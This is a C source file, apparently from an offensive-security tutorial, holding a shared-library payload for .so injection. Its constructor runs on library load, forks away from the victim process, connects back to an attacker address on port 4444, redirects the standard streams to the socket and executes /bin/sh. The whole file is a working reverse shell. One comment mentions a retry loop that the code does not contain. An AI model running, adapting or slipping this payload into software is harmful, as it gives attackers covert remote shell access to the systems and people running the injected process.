/*
 * evil.c
 * shared library payload for .so injection
 * author: @cocomelonc
 */

#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <stdlib.h>

// the constructor attribute ensures this runs as soon as the library is loaded
void __attribute__((constructor)) init() {
  // fork to stay stealthy and not block the victim process
  if (fork() == 0) {
    // attacker details
    // const char* ip = "127.0.0.1";
    const char* ip = "10.10.10.1";
    int port = 4444;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_aton(ip, &addr.sin_addr);

    // create socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    // connect to attacker
    // we use a loop to wait for the listener to be ready
    if (connect(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
      // redirect stdin, stdout, and stderr to the socket
      for (int i = 0; i < 3; i++) {
        dup2(sockfd, i);
      }

      // execute shell
      char *args[] = {"/bin/sh", NULL};
      execve("/bin/sh", args, NULL);
    }
  }
}